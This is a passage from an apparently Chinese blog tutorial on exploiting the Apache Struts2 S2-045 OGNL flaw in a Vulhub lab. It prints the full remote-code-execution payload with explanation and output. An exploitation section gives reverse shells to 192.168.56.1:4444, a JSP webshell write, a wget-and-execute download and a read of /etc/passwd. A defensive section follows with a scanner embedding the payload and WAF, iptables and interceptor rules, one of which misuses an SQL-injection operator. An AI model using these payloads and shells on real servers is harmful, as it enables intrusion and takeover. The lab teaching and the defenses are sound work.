id=\"系统架构\"><a href=\"#系统架构\" class=\"headerlink\" title=\"系统架构\"></a>系统架构</h3><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nix\">┌─ 攻击机（Host）<br>│  └─ Windows<span class=\"hljs-symbol\">/Linux</span> <span class=\"hljs-operator\">+</span> BurpSuite<br>│<br>└─ 靶机（Kali VM）<br>   ├─ <span class=\"hljs-params\">IP:</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.102</span><br>   ├─ Docker <span class=\"hljs-operator\">+</span> Vulhub<br>   └─ Struts2 App (Port <span class=\"hljs-number\">8080</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Docker环境部署\"><a href=\"#Docker环境部署\" class=\"headerlink\" title=\"Docker环境部署\"></a>Docker环境部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 1. 克隆Vulhub项目</span><br>git <span class=\"hljs-built_in\">clone</span> https://github.com/vulhub/vulhub.git<br><br><span class=\"hljs-comment\"># 2. 进入S2-045目录</span><br><span class=\"hljs-built_in\">cd</span> vulhub/struts2/s2-045<br><br><span class=\"hljs-comment\"># 3. 启动靶场</span><br>docker-compose up -d<br><br><span class=\"hljs-comment\"># 4. 验证容器状态</span><br>docker ps -a<br></code></pre></td></tr></table></figure>\n\n<p><strong>预期输出</strong>:</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">CONTAINER</span> ID   IMAGE                   COMMAND       CREATED     STATUS      PORTS                    NAMES<br><span class=\"hljs-attribute\">2363a15cda30</span>   vulhub/struts2:<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">30</span>   <span class=\"hljs-string\">&quot;mvn-server&quot;</span> <span class=\"hljs-number\">2</span>min ago   Up <span class=\"hljs-number\">2</span>min     <span class=\"hljs-number\">0.0.0.0:8080</span>-&gt;<span class=\"hljs-number\">8080</span>/tcp  s2-<span class=\"hljs-number\">045</span>-struts2-<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"环境验证\"><a href=\"#环境验证\" class=\"headerlink\" title=\"环境验证\"></a>环境验证</h3><p>访问 <code>http://192.168.56.102:8080/</code> 应该能看到Struts2默认页面。</p>\n<h2 id=\"漏洞利用实战\"><a href=\"#漏洞利用实战\" class=\"headerlink\" title=\"漏洞利用实战\"></a>漏洞利用实战</h2><h3 id=\"Payload构造原理\"><a href=\"#Payload构造原理\" class=\"headerlink\" title=\"Payload构造原理\"></a>Payload构造原理</h3><p>恶意Content-Type的核心结构：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-attribute\">Content</span>-Type: %&#123;OGNL_EXPRESSION&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"完整攻击载荷\"><a href=\"#完整攻击载荷\" class=\"headerlink\" title=\"完整攻击载荷\"></a>完整攻击载荷</h3><figure class=\"highlight smalltalk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs smalltalk\"><span class=\"hljs-type\">GET</span> / <span class=\"hljs-type\">HTTP</span>/<span class=\"hljs-number\">1.1</span><br><span class=\"hljs-type\">Host</span>: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.102</span>:<span class=\"hljs-number\">8080</span><br><span class=\"hljs-type\">User</span>-<span class=\"hljs-type\">Agent</span>: <span class=\"hljs-type\">Mozilla</span>/<span class=\"hljs-number\">5.0</span> (compatible; <span class=\"hljs-type\">MSIE</span> <span class=\"hljs-number\">9.0</span>; <span class=\"hljs-type\">Windows</span> <span class=\"hljs-type\">NT</span> <span class=\"hljs-number\">6.1</span>; <span class=\"hljs-type\">Win64</span>; x64)<br><span class=\"hljs-type\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*/*;q=<span class=\"hljs-number\">0.8</span><br><span class=\"hljs-type\">Connection</span>: close<br><span class=\"hljs-type\">Content</span>-<span class=\"hljs-type\">Type</span>: %&#123;<br>    (<span class=\"hljs-symbol\">#nike</span>=<span class=\"hljs-string\">&#x27;multipart/form-data&#x27;</span>).<br>    (<span class=\"hljs-symbol\">#dm</span>=@ognl.<span class=\"hljs-type\">OgnlContext</span>@<span class=\"hljs-type\">DEFAULT_MEMBER_ACCESS</span>).<br>    (<span class=\"hljs-symbol\">#_memberAccess</span>?(<span class=\"hljs-symbol\">#_memberAccess</span>=<span class=\"hljs-symbol\">#dm</span>):(<br>        (<span class=\"hljs-symbol\">#container</span>=<span class=\"hljs-symbol\">#context</span>[<span class=\"hljs-string\">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>=<span class=\"hljs-symbol\">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.<span class=\"hljs-type\">OgnlUtil</span>@class)).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>.getExcludedPackageNames().clear()).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>.getExcludedClasses().clear()).<br>        (<span class=\"hljs-symbol\">#context</span>.setMemberAccess(<span class=\"hljs-symbol\">#dm</span>))<br>    )).<br>    (<span class=\"hljs-symbol\">#cmd</span>=<span class=\"hljs-string\">&#x27;whoami&#x27;</span>).<br>    (<span class=\"hljs-symbol\">#iswin</span>=(@java.lang.<span class=\"hljs-type\">System</span>@getProperty(<span class=\"hljs-string\">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class=\"hljs-string\">&#x27;win&#x27;</span>))).<br>    (<span class=\"hljs-symbol\">#cmds</span>=(<span class=\"hljs-symbol\">#iswin</span>?&#123;<span class=\"hljs-string\">&#x27;cmd.exe&#x27;</span>,<span class=\"hljs-string\">&#x27;/c&#x27;</span>,<span class=\"hljs-symbol\">#cmd</span>&#125;:&#123;<span class=\"hljs-string\">&#x27;/bin/bash&#x27;</span>,<span class=\"hljs-string\">&#x27;-c&#x27;</span>,<span class=\"hljs-symbol\">#cmd</span>&#125;)).<br>    (<span class=\"hljs-symbol\">#p</span>=new java.lang.<span class=\"hljs-type\">ProcessBuilder</span>(<span class=\"hljs-symbol\">#cmds</span>)).<br>    (<span class=\"hljs-symbol\">#p</span>.redirectErrorStream(<span class=\"hljs-keyword\">true</span>)).<br>    (<span class=\"hljs-symbol\">#process</span>=<span class=\"hljs-symbol\">#p</span>.start()).<br>    (<span class=\"hljs-symbol\">#ros</span>=(@org.apache.struts2.<span class=\"hljs-type\">ServletActionContext</span>@getResponse().getOutputStream())).<br>    (@org.apache.commons.io.<span class=\"hljs-type\">IOUtils</span>@copy(<span class=\"hljs-symbol\">#process</span>.getInputStream(),<span class=\"hljs-symbol\">#ros</span>)).<br>    (<span class=\"hljs-symbol\">#ros</span>.flush())<br>&#125;<br><span class=\"hljs-type\">Content</span>-<span class=\"hljs-type\">Length</span>: <span class=\"hljs-number\">0</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Payload逐行解析\"><a href=\"#Payload逐行解析\" class=\"headerlink\" title=\"Payload逐行解析\"></a>Payload逐行解析</h3><table>\n<thead>\n<tr>\n<th>表达式片段</th>\n<th>功能说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>#nike=&#39;multipart/form-data&#39;</code></td>\n<td>设置伪装的Content-Type</td>\n</tr>\n<tr>\n<td><code>#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code></td>\n<td>获取默认成员访问权限</td>\n</tr>\n<tr>\n<td><code>#_memberAccess=#dm</code></td>\n<td>绕过Struts2的安全限制</td>\n</tr>\n<tr>\n<td><code>#container=#context[...]</code></td>\n<td>获取ActionContext容器</td>\n</tr>\n<tr>\n<td><code>#ognlUtil.getExcludedPackageNames().clear()</code></td>\n<td>清除包名黑名单</td>\n</tr>\n<tr>\n<td><code>#ognlUtil.getExcludedClasses().clear()</code></td>\n<td>清除类名黑名单</td>\n</tr>\n<tr>\n<td><code>#cmd=&#39;whoami&#39;</code></td>\n<td>定义要执行的命令</td>\n</tr>\n<tr>\n<td><code>#iswin=...contains(&#39;win&#39;)</code></td>\n<td>判断操作系统类型</td>\n</tr>\n<tr>\n<td><code>#cmds=(#iswin?&#123;...&#125;:&#123;...&#125;)</code></td>\n<td>根据系统类型构造命令参数</td>\n</tr>\n<tr>\n<td><code>#p=new ProcessBuilder(#cmds)</code></td>\n<td>创建进程构建器</td>\n</tr>\n<tr>\n<td><code>#process=#p.start()</code></td>\n<td>启动进程执行命令</td>\n</tr>\n<tr>\n<td><code>IOUtils@copy(...)</code></td>\n<td>将命令输出写入HTTP响应</td>\n</tr>\n</tbody></table>\n<h3 id=\"攻击效果演示\"><a href=\"#攻击效果演示\" class=\"headerlink\" title=\"攻击效果演示\"></a>攻击效果演示</h3><p><strong>请求发送后的响应</strong>:</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-meta\">HTTP/1.1</span> <span class=\"hljs-number\">200</span> OK<br><span class=\"hljs-attribute\">Server</span><span class=\"hljs-punctuation\">: </span>Apache-Coyote/1.1<br><span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>text/html;charset=UTF-8<br><span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>9<br><span class=\"hljs-attribute\">Date</span><span class=\"hljs-punctuation\">: </span>Wed, 24 Jul 2025 08:30:45 GMT<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br><br><span class=\"language-haskell\"><span class=\"hljs-title\">www</span>-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span></span></span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"高级利用技巧\"><a href=\"#高级利用技巧\" class=\"headerlink\" title=\"高级利用技巧\"></a>高级利用技巧</h2><h3 id=\"1-信息收集命令\"><a href=\"#1-信息收集命令\" class=\"headerlink\" title=\"1. 信息收集命令\"></a>1. 信息收集命令</h3><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autoit\"><span class=\"hljs-meta\"># 系统信息</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;uname -a&#x27;</span></span><br><br><span class=\"hljs-meta\"># 当前用户</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;id&#x27;</span></span><br><br><span class=\"hljs-meta\"># 网络配置</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ifconfig&#x27;</span></span><br><br><span class=\"hljs-meta\"># 进程列表</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ps aux&#x27;</span></span><br><br><span class=\"hljs-meta\"># 文件系统</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ls -la /&#x27;</span></span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-反弹Shell\"><a href=\"#2-反弹Shell\" class=\"headerlink\" title=\"2. 反弹Shell\"></a>2. 反弹Shell</h3><figure class=\"highlight hsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs hsp\"><span class=\"hljs-meta\"># Bash反弹Shell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;bash -i &gt;&amp; /dev/tcp/<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">4444</span> <span class=\"hljs-number\">0</span>&gt;&amp;<span class=\"hljs-number\">1</span>&#x27;</span><br><br><span class=\"hljs-meta\"># Python反弹Shell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;python -c <span class=\"hljs-string\">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;192.168.56.1\\&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&quot;</span>&#x27;</span><br><br><span class=\"hljs-meta\"># NC反弹Shell  </span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;nc -e /bin/sh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span> <span class=\"hljs-number\">4444</span>&#x27;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-文件操作\"><a href=\"#3-文件操作\" class=\"headerlink\" title=\"3. 文件操作\"></a>3. 文件操作</h3><figure class=\"highlight hsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs hsp\"><span class=\"hljs-meta\"># 读取敏感文件</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;cat /etc/passwd&#x27;</span><br><br><span class=\"hljs-meta\"># 写入WebShell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;echo <span class=\"hljs-string\">&quot;&lt;%@ page import=\\&quot;java.io.*\\&quot; %&gt;&lt;% String cmd = request.getParameter(\\&quot;cmd\\&quot;); Process p = Runtime.getRuntime().exec(cmd); %&gt;&quot;</span> &gt; /tmp/shell.jsp&#x27;</span><br><br><span class=\"hljs-meta\"># 下载文件</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;wget http:<span class=\"hljs-comment\">//192.168.56.1:8000/shell.sh -O /tmp/shell.sh &amp;&amp; chmod +x /tmp/shell.sh &amp;&amp; /tmp/shell.sh&#x27;</span></span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"检测与防护\"><a href=\"#检测与防护\" class=\"headerlink\" title=\"检测与防护\"></a>检测与防护</h2><h3 id=\"漏洞检测脚本\"><a href=\"#漏洞检测脚本\" class=\"headerlink\" title=\"漏洞检测脚本\"></a>漏洞检测脚本</h3><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs livescript\"><span class=\"hljs-comment\">#!/usr/bin/env python3</span><br><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> sys<br><br>def check_s2_045(url):<br>    payload = <span class=\"hljs-string\">&quot;&quot;&quot;%&#123;</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#nike</span>=&#x27;multipart/form-data&#x27;).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#_memberAccess</span>?(<span class=\"hljs-subst\">#_memberAccess</span>=<span class=\"hljs-subst\">#dm</span>):(</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#container</span>=<span class=\"hljs-subst\">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>=<span class=\"hljs-subst\">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>.getExcludedPackageNames().clear()).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>.getExcludedClasses().clear()).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#context</span>.setMemberAccess(<span class=\"hljs-subst\">#dm</span>))</span><br><span class=\"hljs-string\">        )).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#cmd</span>=&#x27;echo &quot;S2045_VULN_TEST&quot;&#x27;).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#cmds</span>=(<span class=\"hljs-subst\">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class=\"hljs-subst\">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class=\"hljs-subst\">#cmd</span>&#125;)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#p</span>=new java.lang.ProcessBuilder(<span class=\"hljs-subst\">#cmds</span>)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#p</span>.redirectErrorStream(true)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#process</span>=<span class=\"hljs-subst\">#p</span>.start()).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class=\"hljs-string\">        (@org.apache.commons.io.IOUtils@copy(<span class=\"hljs-subst\">#process</span>.getInputStream(),<span class=\"hljs-subst\">#ros</span>)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#ros</span>.flush())</span><br><span class=\"hljs-string\">    &#125;&quot;&quot;&quot;</span><br>    <br>    headers = &#123;<br>        <span class=\"hljs-string\">&#x27;Content-Type&#x27;</span>: payload,<br>        <span class=\"hljs-string\">&#x27;User-Agent&#x27;</span>: <span class=\"hljs-string\">&#x27;Mozilla/5.0 (compatible; S2-045-Scanner)&#x27;</span><br>    &#125;<br>    <br>    try:<br>        response = requests.get(url, headers=headers, timeout=<span class=\"hljs-number\">10</span>)<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;S2045_VULN_TEST&quot;</span> <span class=\"hljs-keyword\">in</span> response.text:<br>            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[+] &#123;url&#125; is vulnerable to S2-045!&quot;</span>)<br>            <span class=\"hljs-keyword\">return</span> True<br>        else:<br>            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[-] &#123;url&#125; is not vulnerable to S2-045&quot;</span>)<br>            <span class=\"hljs-keyword\">return</span> False<br>    except Exception <span class=\"hljs-keyword\">as</span> e:<br>        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[!] Error testing &#123;url&#125;: &#123;str(e)&#125;&quot;</span>)<br>        <span class=\"hljs-keyword\">return</span> False<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&quot;__main__&quot;</span>:<br>    <span class=\"hljs-keyword\">if</span> len(sys.argv) != <span class=\"hljs-number\">2</span>:<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Usage: python3 s2-045-check.py &lt;URL&gt;&quot;</span>)<br>        sys.exit(<span class=\"hljs-number\">1</span>)<br>    <br>    target_url = sys.argv[<span class=\"hljs-number\">1</span>]<br>    check_s2_045(target_url)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"安全防护措施\"><a href=\"#安全防护措施\" class=\"headerlink\" title=\"安全防护措施\"></a>安全防护措施</h3><h4 id=\"1-版本升级（根本解决方案）\"><a href=\"#1-版本升级（根本解决方案）\" class=\"headerlink\" title=\"1. 版本升级（根本解决方案）\"></a>1. 版本升级（根本解决方案）</h4><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-comment\"># 升级到安全版本</span><br><span class=\"hljs-attribute\">Apache</span> Struts <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">32</span>+ 或 <span class=\"hljs-number\">2.5.10.1</span>+<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-WAF规则配置\"><a href=\"#2-WAF规则配置\" class=\"headerlink\" title=\"2. WAF规则配置\"></a>2. WAF规则配置</h4><p><strong>ModSecurity规则</strong>:</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-meta\"># 检测S2-045攻击特征</span><br>SecRule REQUEST_HEADERS<span class=\"hljs-punctuation\">:</span>Content<span class=\"hljs-punctuation\">-</span>Type <span class=\"hljs-string\">&quot;@detectSQLi&quot;</span> \\<br>    <span class=\"hljs-string\">&quot;id:1001,\\</span><br>    phase<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-punctuation\">,</span>\\<br>    block<span class=\"hljs-punctuation\">,</span>\\<br>    msg<span class=\"hljs-punctuation\">:</span>&#x27;Struts2 S2-045 Attack Detected&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    logdata<span class=\"hljs-punctuation\">:</span>&#x27;Content-Type: %&#123;MATCHED_VAR&#125;&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    tag<span class=\"hljs-punctuation\">:</span>&#x27;attack-sqli&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    tag<span class=\"hljs-punctuation\">:</span>&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;<span class=\"hljs-string\">&quot;</span><br><br><span class=\"hljs-meta\"># 检测OGNL表达式</span><br>SecRule REQUEST_HEADERS<span class=\"hljs-punctuation\">:</span>Content<span class=\"hljs-punctuation\">-</span>Type <span class=\"hljs-string\">&quot;@contains %&#123;&quot;</span> \\<br>    <span class=\"hljs-string\">&quot;id:1002,\\</span><br>    phase<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-punctuation\">,</span>\\<br>    block<span class=\"hljs-punctuation\">,</span>\\<br>    msg<span class=\"hljs-punctuation\">:</span>&#x27;Potential OGNL Injection in Content-Type&#x27;<span class=\"hljs-string\">&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-网络层防护\"><a href=\"#3-网络层防护\" class=\"headerlink\" title=\"3. 网络层防护\"></a>3. 网络层防护</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"># iptables规则示例<br>iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp <span class=\"hljs-attr\">--dport</span> <span class=\"hljs-number\">8080</span> -m string <span class=\"hljs-attr\">--string</span> &quot;%&#123;&quot; <span class=\"hljs-attr\">--algo</span> bm -j DROP<br>iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp <span class=\"hljs-attr\">--dport</span> <span class=\"hljs-number\">8080</span> -m string <span class=\"hljs-attr\">--string</span> &quot;ognl&quot; <span class=\"hljs-attr\">--algo</span> bm -j DROP<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-应用层加固\"><a href=\"#4-应用层加固\" class=\"headerlink\" title=\"4. 应用层加固\"></a>4. 应用层加固</h4><figure class=\"highlight scala\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scala\"><span class=\"hljs-comment\">// 自定义拦截器</span><br>public <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">SecurityInterceptor</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">AbstractInterceptor</span> </span>&#123;<br>    <span class=\"hljs-meta\">@Override</span><br>    public <span class=\"hljs-type\">String</span> intercept(<span class=\"hljs-type\">ActionInvocation</span> invocation) <span class=\"hljs-keyword\">throws</span> <span class=\"hljs-type\">Exception</span> &#123;<br>        <span class=\"hljs-type\">HttpServletRequest</span> request = <span class=\"hljs-type\">ServletActionContext</span>.getRequest();<br>        <span class=\"hljs-type\">String</span> contentType = request.getContentType();<br>        <br>        <span class=\"hljs-keyword\">if</span> (contentType != <span class=\"hljs-literal\">null</span> &amp;&amp; contentType.contains(<span class=\"hljs-string\">&quot;%&#123;&quot;</span>)) &#123;<br>            <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-type\">SecurityException</span>(<span class=\"hljs-string\">&quot;Malicious Content-Type detected&quot;</span>);<br>        &#125;<br>        <br>        <span class=\"hljs-keyword\">return</span> invocation.invoke();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"实战技巧与工具\"><a href=\"#实战技巧与工具\" class=\"headerlink\" title=\"实战技巧与工具\"></a>实战技巧与工具</h2><h3 id=\"BurpSuite插件开发\"><a href=\"#BurpSuite插件开发\" class=\"headerlink\" title=\"BurpSuite插件开发\"></a>BurpSuite插件开发</h3><figure class=\"highlight 